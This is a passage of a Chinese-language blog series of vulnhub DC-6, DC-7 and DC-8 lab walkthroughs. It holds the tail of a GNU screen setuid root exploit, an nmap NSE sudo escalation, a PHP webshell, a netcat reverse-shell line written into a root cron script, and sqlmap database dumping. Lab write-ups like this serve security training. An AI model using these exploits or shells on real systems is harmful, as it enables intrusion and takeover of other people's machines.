</span></span></span><span style=display:flex><span><span style=color:#e6db74>    setegid(0);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    execvp(&#34;/bin/sh&#34;, NULL, NULL);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>EOF</span>
</span></span><span style=display:flex><span>gcc -o /tmp/rootshell /tmp/rootshell.c
</span></span><span style=display:flex><span>rm -f /tmp/rootshell.c
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Now we create our /etc/ld.so.preload file...&#34;</span>
</span></span><span style=display:flex><span>cd /etc
</span></span><span style=display:flex><span>umask <span style=color:#ae81ff>000</span> <span style=color:#75715e># because</span>
</span></span><span style=display:flex><span>screen -D -m -L ld.so.preload echo -ne  <span style=color:#e6db74>&#34;\x0a/tmp/libhax.so&#34;</span> <span style=color:#75715e># newline needed</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Triggering...&#34;</span>
</span></span><span style=display:flex><span>screen -ls <span style=color:#75715e># screen itself is setuid, so...</span>
</span></span><span style=display:flex><span>/tmp/rootshell
</span></span></code></pre></div><p>上传到靶机执行即可提权，/root/thisistheflag.txt：</p><pre tabindex=0><code>888b    888 d8b                                                      888      888 888 888 
8888b   888 Y8P                                                      888      888 888 888 
88888b  888                                                          888      888 888 888 
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888 
888 Y88b888 888 d88P&#34;   d8P  Y8b      888  888  888 d88&#34;&#34;88b 888P&#34;   888 .88P 888 888 888 
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P 
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &#34;88b  &#34;   &#34;   &#34;  
888    Y888 888  &#34;Y8888P &#34;Y8888        &#34;Y8888888P&#34;   &#34;Y88P&#34;  888     888  888 888 888 888 
                                                                                          
                                                                                          


Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it&#39;s all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.
</code></pre><hr><h2 id=vulnhub-dc6>vulnhub DC6<a hidden class=anchor aria-hidden=true href=#vulnhub-dc6>#</a></h2><p>nmap扫描开放端口及服务：</p><pre tabindex=0><code>$ nmap 61.139.2.0/24

Nmap scan report for 61.139.2.141
Host is up (0.00024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre><p>配置hosts文件：</p><pre tabindex=0><code>61.139.2.141 wordy
</code></pre><p>枚举用户：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ wpscan --url http://wordy -e u
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> User<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> Identified:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> admin
</span></span><span style=display:flex><span> | Found By: Rss Generator <span style=color:#f92672>(</span>Passive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> | Confirmed By:
</span></span><span style=display:flex><span> |  Wp Json Api <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page<span style=color:#f92672>=</span>100&amp;page<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> |  Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |  Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> graham
</span></span><span style=display:flex><span> | Found By: Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> | Confirmed By: Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> mark
</span></span><span style=display:flex><span> | Found By: Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> | Confirmed By: Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> sarah
</span></span><span style=display:flex><span> | Found By: Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> | Confirmed By: Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> jens
</span></span><span style=display:flex><span> | Found By: Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> | Confirmed By: Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>爆破密码得到mark/helpdesk01，插件存在漏洞cve-2018-15877，反弹shell：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>find / -perm -u<span style=color:#f92672>=</span>s -type f 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style=display:flex><span>/usr/lib/openssh/ssh-keysign
</span></span><span style=display:flex><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style=display:flex><span>/usr/bin/chfn
</span></span><span style=display:flex><span>/usr/bin/sudo
</span></span><span style=display:flex><span>/usr/bin/gpasswd
</span></span><span style=display:flex><span>/usr/bin/newgrp
</span></span><span style=display:flex><span>/usr/bin/chsh
</span></span><span style=display:flex><span>/usr/bin/passwd
</span></span><span style=display:flex><span>/bin/su
</span></span><span style=display:flex><span>/bin/mount
</span></span><span style=display:flex><span>/bin/umount
</span></span><span style=display:flex><span>/bin/ping
</span></span></code></pre></div><p>/home/mark/stuff/things-to-do.txt：</p><pre tabindex=0><code>Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah&#39;s farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah&#39;s replacement
</code></pre><p>生成伪终端用于执行su：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python -c <span style=color:#e6db74>&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
</span></span></code></pre></div><p>登录graham用户，<code>sudo -l</code>查看可执行命令：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>graham@dc-6:/var/www/html/wp-admin$ sudo -l
</span></span><span style=display:flex><span>sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> graham on dc-6:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User graham may run the following commands on dc-6:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>jens<span style=color:#f92672>)</span> NOPASSWD: /home/jens/backups.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>graham@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
</span></span><span style=display:flex><span>cat /home/jens/backups.sh
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>tar -czf backups.tar.gz /var/www/html
</span></span></code></pre></div><p>继续反弹shell获取jens用户权限，向/home/jens/backups.sh写入反弹shell脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>graham@dc-6:/var/www/html/wp-admin$ sudo -u jens /home/jens/backups.sh
</span></span></code></pre></div><p>nmap提权：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>jens@dc-6:/var/www/html/wp-admin$ sudo -l
</span></span><span style=display:flex><span>sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> jens on dc-6:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User jens may run the following commands on dc-6:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/nmap
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>jens@dc-6:/var/www/html/wp-admin$ echo <span style=color:#e6db74>&#34;os.execute(&#39;/bin/sh&#39;)&#34;</span> &gt; /tmp/shell.nse
</span></span><span style=display:flex><span>jens@dc-6:/var/www/html/wp-admin$ sudo nmap --script<span style=color:#f92672>=</span>/tmp/shell.nse
</span></span></code></pre></div><p>/root/theflag.txt：</p><pre tabindex=0><code>Yb        dP 888888 88     88         8888b.   dP&#34;Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;&#39; 
   YP  YP    888888 88ood8 88ood8     8888Y&#34;   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><p>参考资料：</p><p><a href=https://www.cnblogs.com/cuerz/p/15576711.html>https://www.cnblogs.com/cuerz/p/15576711.html</a></p><p><a href=https://cloud.tencent.com/developer/article/1717979>https://cloud.tencent.com/developer/article/1717979</a></p><hr><h2 id=vulnhub-dc7>vulnhub DC7<a hidden class=anchor aria-hidden=true href=#vulnhub-dc7>#</a></h2><p>nmap扫描开放端口及服务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.137
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00048s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><p>访问web服务：</p><p><img alt=alt loading=lazy src=/images/vulnhub/5.png></p><p><code>https://github.com/Dc7User</code>中有网站源码，config.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>	$servername <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;localhost&#34;</span>;
</span></span><span style=display:flex><span>	$username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;dc7user&#34;</span>;
</span></span><span style=display:flex><span>	$password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;MdR3xOgB7#dW&#34;</span>;
</span></span><span style=display:flex><span>	$dbname <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Staff&#34;</span>;
</span></span><span style=display:flex><span>	$conn <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_connect</span>($servername, $username, $password, $dbname);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>网站登录失败，尝试ssh登录成功，<code>dc7user</code>目录下存在<code>mbox</code>文件，渗透时收到一封邮件：</p><pre tabindex=0><code>You have new mail in /var/mail/dc7user
</code></pre><p>/var/mail/dc7user其中一封邮件：</p><pre tabindex=0><code>From root@dc-7 Sun Sep 28 12:45:04 2025
Return-path: &lt;root@dc-7&gt;
Envelope-to: root@dc-7
Delivery-date: Sun, 28 Sep 2025 12:45:04 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from &lt;root@dc-7&gt;)
        id 1v2hPM-0000N4-Ms
        for root@dc-7; Sun, 28 Sep 2025 12:45:04 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;
X-Cron-Env: &lt;SHELL=/bin/sh&gt;
X-Cron-Env: &lt;HOME=/root&gt;
X-Cron-Env: &lt;LOGNAME=root&gt;
Message-Id: &lt;E1v2hPM-0000N4-Ms@dc-7&gt;
Date: Sun, 28 Sep 2025 12:45:04 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
</code></pre><p>每封邮件内容一致，每15分钟有一封，也就是说存在每15分钟执行一次的定时任务：</p><pre tabindex=0><code>Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh
</code></pre><p>查看sh脚本权限：</p><pre tabindex=0><code>$ ls /opt/scripts/backups.sh -l
-rwxrwxr-x 1 root www-data 520 Aug 29  2019 /opt/scripts/backups.sh
</code></pre><p>/opt/scripts/backups.sh：</p><pre tabindex=0><code>#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
</code></pre><p>接下来就是获取www-data的权限，先查看drush的权限：</p><pre tabindex=0><code>$ ls /usr/local/bin/drush -l
-rwxr-xr-x 1 root root 4789623 Jul 10  2019 /usr/local/bin/drush
</code></pre><p>Drush可以用于直接从云服务器命令行管理 Drupal：</p><pre tabindex=0><code>$ drush status
 Drupal version                  :  8.7.6                                                                                                      
 Site URI                        :  http://default                                                                                             
 Database driver                 :  mysql                                                                                                      
 Database hostname               :  localhost                                                                                                  
 Database port                   :                                                                                                             
 Database username               :  db7user                                                                                                    
 Database name                   :  d7db                                                                                                       
 Database                        :  Connected                                                                                                  
 Drupal bootstrap                :  Successful                                                                                                 
 Drupal user                     :                                                                                                             
 Default theme                   :  bartik                                                                                                     
 Administration theme            :  seven                                                                                                      
 PHP configuration               :  /etc/php/7.0/cli/php.ini                                                                                   
 PHP OS                          :  Linux                                                                                                      
 Drush script                    :  /usr/local/bin/drush                                                                                       
 Drush version                   :  8.3.0                                                                                                      
 Drush temp directory            :  /tmp                                                                                                       
 Drush configuration             :                                                                                                             
 Drush alias files               :                                                                                                             
 Install profile                 :  standard                                                                                                   
 Drupal root                     :  /var/www/html                                                                                              
 Drupal Settings File            :  sites/default/settings.php                                                                                 
 Site path                       :  sites/default                                                                                              
 File directory path             :  sites/default/files                                                                                        
 Temporary file directory path   :  /tmp                                                                                                       
 Sync config path                :  sites/default/files/config_yQDLLJdPf9UT4DSAB5Wfl6XeoBn0AqtLqUYyVc4KUWQW-3USMUdXWY0UZmZ3Az5mT_DMS955DQ/sync 
</code></pre><p>尝试修改admin密码：</p><pre tabindex=0><code>$ drush user-password admin --password=&#34;12345&#34;
Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.               [error]
The drush command &#39;user-password admin&#39; could not be executed.

$ cd /var/www/html
$ drush user-password admin --password=&#34;12345&#34;
Changed password for admin
</code></pre><p>Drush8中存在可以解析php内容的插件：<code>https://www.drupal.org/project/php</code>，添加对应插件并使用：</p><p><img alt=alt loading=lazy src=/images/vulnhub/6.png></p><p>写入一句话木马：</p><p><img alt=alt loading=lazy src=/images/vulnhub/7.png></p><p>蚁剑连上终端就是<code>www-data</code>用户，修改<code>/opt/scripts/backups.sh</code>文件实现反弹shell，等待定时任务执行实现提取：</p><pre tabindex=0><code>$ echo &#39;nc 61.139.2.128 2333 -e /bin/bash&#39; &gt; /opt/scripts/backups.sh
</code></pre><p>拿到root权限后先看一下定时任务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>crontab -l
</span></span><span style=display:flex><span><span style=color:#75715e># Edit this file to introduce tasks to be run by cron.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># Each task to run has to be defined through a single line</span>
</span></span><span style=display:flex><span><span style=color:#75715e># indicating with different fields when the task will be run</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and what command to run for the task</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># To define the time you can provide concrete values for</span>
</span></span><span style=display:flex><span><span style=color:#75715e># minute (m), hour (h), day of month (dom), month (mon),</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).# </span>
</span></span><span style=display:flex><span><span style=color:#75715e># Notice that tasks will be started based on the cron&#39;s system</span>
</span></span><span style=display:flex><span><span style=color:#75715e># daemon&#39;s notion of time and timezones.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># Output of the crontab jobs (including errors) is sent through</span>
</span></span><span style=display:flex><span><span style=color:#75715e># email to the user the crontab file belongs to (unless redirected).</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PATH<span style=color:#f92672>=</span>/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># For example, you can run a backup of all your user accounts</span>
</span></span><span style=display:flex><span><span style=color:#75715e># at 5 a.m every week with:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># For more information see the manual pages of crontab(5) and cron(8)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># m h  dom mon dow   command</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>*/15 * * * * /opt/scripts/backups.sh
</span></span></code></pre></div><p>theflag.txt：</p><pre tabindex=0><code>



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  &#34;Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88&#34;&#34;88b 888 &#34;88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &#34;   &#34;   &#34;   &#34;  
888P     Y888  &#34;Y8888  888 888      8888888P&#34;   &#34;Y88P&#34;  888  888  &#34;Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I&#39;m sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><p>参考资料：</p><p><a href=https://www.drupal.org/project/php>https://www.drupal.org/project/php</a></p><p><a href=https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz>https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz</a></p><hr><h2 id=vulnhub-dc8>vulnhub DC8<a hidden class=anchor aria-hidden=true href=#vulnhub-dc8>#</a></h2><p>nmap扫描开放端口及服务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.138
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00091s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><p>访问web服务：</p><p><img alt=alt loading=lazy src=/images/vulnhub/8.png></p><p>存在sql注入，注入点为nid，使用sqlmap：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ sqlmap -u http://61.139.2.138/?nid<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>GET parameter <span style=color:#e6db74>&#39;nid&#39;</span> is vulnerable.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sqlmap -u http://61.139.2.138/?nid<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> --current-db
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>14:07:43<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching current database
</span></span><span style=display:flex><span>current database: <span style=color:#e6db74>&#39;d7db&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sqlmap -u http://61.139.2.138/?nid<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -D d7db --tables
</span></span><span style=display:flex><span>Database: d7db
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>88</span> tables<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+-----------------------------+
</span></span><span style=display:flex><span>| block                       |
</span></span><span style=display:flex><span>| cache                       |
</span></span><span style=display:flex><span>| filter                      |
</span></span><span style=display:flex><span>| history                     |
</span></span><span style=display:flex><span>| role                        |
</span></span><span style=display:flex><span>| system                      |
</span></span><span style=display:flex><span>| actions                     |
</span></span><span style=display:flex><span>| authmap                     |
</span></span><span style=display:flex><span>| batch                       |
</span></span><span style=display:flex><span>| block_custom                |
</span></span><span style=display:flex><span>| block_node_type             |
</span></span><span style=display:flex><span>| block_role                  |
</span></span><span style=display:flex><span>| blocked_ips                 |
</span></span><span style=display:flex><span>| cache_block                 |
</span></span><span style=display:flex><span>| cache_bootstrap             |
</span></span><span style=display:flex><span>| cache_field                 |
</span></span><span style=display:flex><span>| cache_filter                |
</span></span><span style=display:flex><span>| cache_form                  |
</span></span><span style=display:flex><span>| cache_image                 |
</span></span><span style=display:flex><span>| cache_menu                  |
</span></span><span style=display:flex><span>| cache_page                  |
</span></span><span style=display:flex><span>| cache_path                  |
</span></span><span style=display:flex><span>| cache_views                 |
</span></span><span style=display:flex><span>| cache_views_data            |
</span></span><span style=display:flex><span>| ckeditor_input_format       |
</span></span><span style=display:flex><span>| ckeditor_settings           |
</span></span><span style=display:flex><span>| ctools_css_cache            |
</span></span><span style=display:flex><span>| ctools_object_cache         |
</span></span><span style=display:flex><span>| date_format_locale          |
</span></span><span style=display:flex><span>| date_format_type            |
</span></span><span style=display:flex><span>| date_formats                |
</span></span><span style=display:flex><span>| field_config                |
</span></span><span style=display:flex><span>| field_config_instance       |
</span></span><span style=display:flex><span>| field_data_body             |
</span></span><span style=display:flex><span>| field_data_field_image      |
</span></span><span style=display:flex><span>| field_data_field_tags       |
</span></span><span style=display:flex><span>| field_revision_body         |
</span></span><span style=display:flex><span>| field_revision_field_image  |
</span></span><span style=display:flex><span>| field_revision_field_tags   |
</span></span><span style=display:flex><span>| file_managed                |
</span></span><span style=display:flex><span>| file_usage                  |
</span></span><span style=display:flex><span>| filter_format               |
</span></span><span style=display:flex><span>| flood                       |
</span></span><span style=display:flex><span>| image_effects               |
</span></span><span style=display:flex><span>| image_styles                |
</span></span><span style=display:flex><span>| menu_custom                 |
</span></span><span style=display:flex><span>| menu_links                  |
</span></span><span style=display:flex><span>| menu_router                 |
</span></span><span style=display:flex><span>| node                        |
</span></span><span style=display:flex><span>| node_access                 |
</span></span><span style=display:flex><span>| node_revision               |
</span></span><span style=display:flex><span>| node_type                   |
</span></span><span style=display:flex><span>| queue                       |
</span></span><span style=display:flex><span>| rdf_mapping                 |
</span></span><span style=display:flex><span>| registry                    |
</span></span><span style=display:flex><span>| registry_file               |
</span></span><span style=display:flex><span>| role_permission             |
</span></span><span style=display:flex><span>| search_dataset              |
</span></span><span style=display:flex><span>| search_index                |
</span></span><span style=display:flex><span>| search_node_links           |
</span></span><span style=display:flex><span>| search_total                |
</span></span><span style=display:flex><span>| semaphore                   |
</span></span><span style=display:flex><span>| sequences                   |
</span></span><span style=display:flex><span>| sessions                    |
</span></span><span style=display:flex><span>| shortcut_set                |
</span></span><span style=display:flex><span>| shortcut_set_users          |
</span></span><span style=display:flex><span>| site_messages_table         |
</span></span><span style=display:flex><span>| taxonomy_index              |
</span></span><span style=display:flex><span>| taxonomy_term_data          |
</span></span><span style=display:flex><span>| taxonomy_term_hierarchy     |
</span></span><span style=display:flex><span>| taxonomy_vocabulary         |
</span></span><span style=display:flex><span>| url_alias                   |
</span></span><span style=display:flex><span>| users                       |
</span></span><span style=display:flex><span>| users_roles                 |
</span></span><span style=display:flex><span>| variable                    |
</span></span><span style=display:flex><span>| views_display               |
</span></span><span style=display:flex><span>| views_view                  |
</span></span><span style=display:flex><span>| watchdog                    |
</span></span><span style=display:flex><span>| webform                     |
</span></span><span style=display:flex><span>| webform_component           |
</span></span><span style=display:flex><span>| webform_conditional         |
</span></span><span style=display:flex><span>| webform_conditional_actions |
</span></span><span style=display:flex><span>| webform_conditional_rules   |
</span></span><span style=display:flex><span>| webform_emails              |
</span></span><span style=display:flex><span>| webform_last_download       |
</span></span><span style=display:flex><span>| webform_roles               |
</span></span><span style=display:flex><span>| webform_submissions         |
</span></span><span style=display:flex><span>| webform_submitted_data      |
</span></span><span style=display:flex><span>+-----------------------------+
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sqlmap -u http://61.139.2.138/?nid<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> -D d7db -T users --columns
</span></span><span style=display:flex><span>Database: d7db
</span></span><span style=display:flex><span>Table: users
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>16</span> columns<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+------------------+------------------+
</span></span><span style=display:flex><span>| Column           | Type             |
</span></span><span style=display:flex><span>+------------------+------------------+
</span></span><span style=display:flex><span>| data             | longblob         |
</span></span><span style=display:flex><span>| language         | varchar<span style=color:#f92672>(</span>12<span style=color:#f92672>)</span>      |
</span></span><span style=display:flex><span>| name             | varchar<span style=color:#f92672>(</span>60<span style=color:#f92672>)</span>      |
</span></span><span style=display:flex><span>| status           | tinyint<span style=color:#f92672>(</span>4<span style=color:#f92672>)</span>       |
</span></span><span style=display:flex><span>| access           | int<span style=color:#f92672>(</span>11<span style=color:#f92672>)</span>          |
</span></span><span style=display:flex><span>| created          | int<span style=color:#f92672>(</span>11<span style=color:#f92672>)</span>          |
